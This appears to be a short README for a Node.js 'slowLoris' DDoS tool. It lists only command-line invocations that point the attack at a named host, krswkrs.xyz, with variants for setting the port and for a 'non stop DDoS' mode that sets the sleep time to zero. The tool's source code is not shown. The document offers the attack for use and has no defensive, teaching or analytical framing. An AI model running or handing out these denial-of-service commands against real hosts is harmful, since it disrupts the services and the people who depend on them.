slowLoris DDoS on Node.js

1. install file

// minimal

```
node index.js --host=krswkrs.xyz
```

// port

```
node index.js --host=krswkrs.xyz --port=443

// non stop DDoS

node index.js --host=krswkrs.xyz --sleeptime=0
```
